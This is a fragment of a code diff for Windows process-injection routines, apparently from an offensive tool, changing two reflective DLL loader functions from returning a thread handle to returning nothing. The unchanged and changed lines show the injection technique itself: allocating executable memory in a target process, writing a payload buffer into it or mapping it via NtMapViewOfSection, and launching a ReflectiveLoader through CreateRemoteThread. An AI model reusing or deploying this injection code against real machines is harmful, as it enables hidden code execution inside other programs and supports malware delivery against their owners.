@@ -29,9 +29,9 @@ void set_param(int payload_type) {
 	}
 }
 
-HANDLE WINAPI LoadRemoteLibraryR(int payload_type, HANDLE hProcess)
+void WINAPI LoadRemoteLibraryR(int payload_type, HANDLE hProcess)
 {
-	HANDLE hThread = NULL;
+
 	LPVOID lpRemoteLibraryBuffer = NULL;
 	LPTHREAD_START_ROUTINE lpReflectiveLoader = NULL;
 	DWORD dwThreadId = 0;
@@ -44,7 +44,7 @@ HANDLE WINAPI LoadRemoteLibraryR(int payload_type, HANDLE hProcess)
 		// alloc memory (RWX) in the host process for the image
 		lpRemoteLibraryBuffer = VirtualAllocEx(hProcess, NULL, buflen, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
 		if (!lpRemoteLibraryBuffer)
-			return NULL;
+			return;
 
 
 		char* tp = (char*)buf;
@@ -52,7 +52,7 @@ HANDLE WINAPI LoadRemoteLibraryR(int payload_type, HANDLE hProcess)
 		// write the image into the host process
 		if (!WriteProcessMemory(hProcess, lpRemoteLibraryBuffer, buf, buflen, NULL))
 		{
-			return NULL;
+			return;
 		}
 
 
@@ -61,14 +61,13 @@ HANDLE WINAPI LoadRemoteLibraryR(int payload_type, HANDLE hProcess)
 
 
 		// create a remote thread in the host process to call the ReflectiveLoader
-		hThread = CreateRemoteThread(hProcess, NULL, 1024 * 1024, lpReflectiveLoader, param, (DWORD)NULL, &dwThreadId);
+		CreateRemoteThread(hProcess, NULL, 1024 * 1024, lpReflectiveLoader, param, (DWORD)NULL, &dwThreadId);
+
 	}
 	catch (...)
 	{
-		hThread = NULL;
 	}
 
-	return hThread;
 }
 
 
@@ -87,9 +86,9 @@ static NTSTATUS(*PNtMapViewOfSection)(
 	);
 
 
-HANDLE WINAPI LoadRemoteLibraryR2(int payload_type, HANDLE hProcess)
+void WINAPI LoadRemoteLibraryR2(int payload_type, HANDLE hProcess)
 {
-	HANDLE hThread = NULL;
+
 	HANDLE fm;
 	char* map_addr;
 	LPVOID lpMap = 0;
@@ -117,14 +116,13 @@ HANDLE WINAPI LoadRemoteLibraryR2(int payload_type, HANDLE hProcess)
 		lpReflectiveLoader = (LPTHREAD_START_ROUTINE)((ULONG_PTR)lpMap + offset);
 
 		// create a remote thread in the host process to call the ReflectiveLoader
-		hThread = CreateRemoteThread(hProcess, NULL, 1024 * 1024, lpReflectiveLoader, param, (DWORD)NULL, &dwThreadId);
+		CreateRemoteThread(hProcess, NULL, 1024 * 1024, lpReflectiveLoader, param, (DWORD)NULL, &dwThreadId);
 	}
 	catch (...)
 	{
-		hThread = NULL;
+
 	}
 
-	return hThread;
 }
 
 
